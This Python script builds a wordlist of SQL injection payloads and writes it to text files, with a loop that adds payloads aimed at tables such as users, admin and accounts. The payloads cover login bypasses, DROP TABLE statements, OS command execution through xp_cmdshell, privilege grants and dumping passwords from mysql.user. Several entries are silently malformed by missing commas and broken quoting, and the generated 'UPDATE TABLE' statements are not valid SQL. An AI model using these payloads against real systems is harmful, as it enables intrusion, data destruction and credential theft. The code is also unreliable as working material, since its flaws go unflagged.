# List of advanced SQLi payloads add any payloads you would like to append to the list 
sqli_payloads = [
    "'; DROP TABLE users; --",
    "'; UNION SELECT null, table_name FROM information_schema.tables; --",
    "'; WAITFOR DELAY '0:0:5'; --",
    "'; EXEC xp_cmdshell('dir'); --",
    "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM information_schema.tables))--",
    "' AND ASCII(SUBSTRING((SELECT TOP 1 table_name FROM information_schema.tables), 1, 1)) > 64 --",
    "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
    "admin' OR 1=1--",
    "admin') OR ('1'='1' --",
    "'; EXEC sp_MSForEachTable 'DROP TABLE ?'; --",
    "'; SELECT user, password FROM mysql.user; --",
    "'; UNION ALL SELECT NULL,NULL,NULL,NULL,NULL FROM dual; --",
    "admin')--",
    "' AND 1=(SELECT COUNT(*) FROM tablenames); --",
    "') OR 1=1--",
    "' UNION ALL SELECT NULL,NULL,NULL,NULL;--",
    "' OR 'x'='x'; --",
    "'; IF (1=1) SELECT 'Authenticated'; --",
    "' UNION SELECT 1, 'anotheruser', 'doesn't matter', 1; --",
    "' OR EXISTS (SELECT 1 FROM information_schema.tables); --",
    "; --,"
    "'; --",
    "'); --,"
    "'; exec master..xp_cmdshell 'ping 10.10.1.2'--",
    "' grant connect to name; grant resource to name; --",
    "' or 1=1 --," 
    "' union (select @@version) --",
    "' union (select NULL, (select @@version)) --",
    "' union (select NULL, NULL, (select @@version)) --,"
    "' union (select NULL, NULL, NULL,  (select @@version)) --",
    "' union (select NULL, NULL, NULL, NULL,  (select @@version)) --",
    "' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --",
]

# Function to write SQLi payloads to a text file
def write_sqli_to_file(filename, payloads):
    with open(filename, 'w') as file:
        for payload in payloads:
            file.write(payload + "\n")

# Call the function with the desired filename
write_sqli_to_file("advanced_sqli_payloads.txt", sqli_payloads)

# Additional SQLi payload generation logic add known table names below
for table in ['users', 'admin', 'accounts']:
    for action in ['UPDATE TABLE', 'SELECT * FROM']:
        sqli_payloads.append(f"'; {action} {table}; --")

# Ensure unique payloads
sqli_payloads = list(set(sqli_payloads))

# Write to file
write_sqli_to_file("advanced_sqli_payloads_extended.txt", sqli_payloads)